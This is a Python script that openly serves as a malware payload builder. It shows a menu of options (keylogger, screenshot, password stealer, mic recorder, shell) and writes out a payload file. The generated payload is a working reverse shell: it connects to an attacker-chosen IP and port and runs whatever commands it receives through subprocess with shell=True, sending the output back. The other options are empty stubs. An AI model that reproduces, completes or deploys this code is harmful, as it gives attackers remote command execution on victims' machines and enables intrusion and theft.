from os.path import exists
from time import strftime
import sys
import os
import time


options = '''
keylogger
screenshot
recurring
emailupdate
passwdstealer
micrecorder
shell
***Type no <option> to cancel option***
***Type generate to begin generating a payload***
    '''

keylogger = False
screenshot = False
recurring = False
emailupdate = False
passwdstealer = False
micrecorder = False


def main():
    global keylogger,screenshot,recurring,emailupdate,passwdstealer,micrecorder
    os.system('cls')
    print('      ▄████ ▓█████  ███▄    █ ▓█████  ██▀███   ▄▄▄     ▄▄▄█████▓▓█████     ▄▄▄          ██▓███   ▄▄▄     ▓██   ██▓ ██▓     ▒█████   ▄▄▄      ▓█████▄ ')
    print('     ██▒ ▀█▒▓█   ▀  ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒▓█   ▀    ▒████▄       ▓██░  ██▒▒████▄    ▒██  ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌')
    print('    ▒██░▄▄▄░▒███   ▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░▒███      ▒██  ▀█▄     ▓██░ ██▓▒▒██  ▀█▄   ▒██ ██░▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌')
    print('    ░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░ ▒▓█  ▄    ░██▄▄▄▄██    ▒██▄█▓▒ ▒░██▄▄▄▄██  ░ ▐██▓░▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌')
    print('    ░▒▓███▀▒░▒████▒▒██░   ▓██░░▒████▒░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░ ░▒████▒    ▓█   ▓██▒   ▒██▒ ░  ░ ▓█   ▓██▒ ░ ██▒▓░░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓▌')
    print('     ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░   ░░ ▒░ ░    ▒▒   ▓▒█░   ▒▓▒░ ░  ░ ▒▒   ▓▒█░  ██▒▒▒ ░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ ')
    print('      ░   ░  ░ ░  ░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░  ▒   ▒▒ ░   ░     ░ ░  ░     ▒   ▒▒ ░   ░▒ ░       ▒   ▒▒ ░▓██ ░▒░ ░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ ')
    print('    ░ ░   ░    ░      ░   ░ ░    ░     ░░   ░   ░   ▒    ░         ░        ░   ▒      ░░         ░   ▒   ▒ ▒ ░░    ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ ')
    print('      ░    ░  ░         ░    ░  ░   ░           ░  ░           ░  ░         ░  ░                  ░  ░░ ░         ░  ░    ░ ░        ░  ░   ░        ')
    print('                                                                                                      ░ ░                                 ░          ')
    print('Type "options" to view all payload settings')
    #ik its inefficent but i dont give a fuck
    while True:
        inp = input(':>')
        if inp == 'options':
            print(options)
        elif inp == 'keylogger':
            keylogger = True
            print('keylogger ---> True')
        elif inp == 'screenshot':
            screenshot = True
            print('screenshot ---> True')
        elif inp == 'recurring':
            recurring = True
            print('recurring ---> True')
        elif inp == 'emailupdate':
            emailupdate = True
            print('emailupdate ---> True')
        elif inp == 'passwdstealer':
            passwdstealer = True
            print('passwdstealer  ---> True')
        elif inp == 'micrecorder':
            micrecorder = True
            print('shell ---> True')
        elif inp == 'cls':
            os.system('cls')
            main()
        elif inp == 'no keylogger':
            keylogger = False
            print('keylogger ---> False')
        elif inp == 'no screenshot':
            screenshot = False
            print('screenshot ---> False')
        elif inp == 'no recurring':
            recurring = False
            print('recurring ---> False')
        elif inp == 'no emailupdate':
            emailupdate = False
            print('emailupdate ---> False')
        elif inp == 'no passwdstealer':
            passwdstealer = False
            print('passwdstealer  ---> False')
        elif inp == 'no micrecorder':
            micrecorder = False
            print('micrecorder  ---> False')
        elif inp == 'exit':
            print('bye bye')
            exit()
        elif inp == 'generate':
            generate()
        else:
            print('unrecognized command')
            time.sleep(1)
            main()
        

def generate():
    title = input("Payload Title:> ")
    ip = input('Enter Listening IP:>')
    port = input('Enter Listening Port:>')
    title = title + '.py'
    title = title.lower()
    title = title.replace(' ', '_')
    if exists(title):
        print("\nA a file with this name already exists.")
        exit(1)
    filename = open(title, 'w')
    string = (\
"""
import socket
import os
import subprocess
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n""",
'client.connect(('"'",ip,"'", ',' , port,'))\n'
"""def recieve():
    while True:
            message = client.recv(1024)
            message = message.decode()
            print(message)
            if not message:
                recieve()
            update = subprocess.check_output(message, shell=True)
            response = update
            print(response)
            client.send(response)
            recieve()
        

""")
    string =  ''.join(string)
    if keylogger == True:
        print('adding keylogger')
        string = string + '''
        '''
    if screenshot == True:
        print('adding screenshot')
        string = string + '''
        '''
    if recurring == True:
        print('adding recurring')
        string = string + '''
        '''
    if emailupdate == True:
        print('adding emailupdate')
        string = string + '''
        '''
    if passwdstealer == True:
        print('adding passwordstealer')
        string = string + '''
        '''
    if micrecorder == True:
        print('adding micrecorder')
        string = string + '''
        '''

    string = string + "recieve()"
    filename.write(string)
    filename.close()
    print('payload complete')

if __name__ == "__main__":
	main()
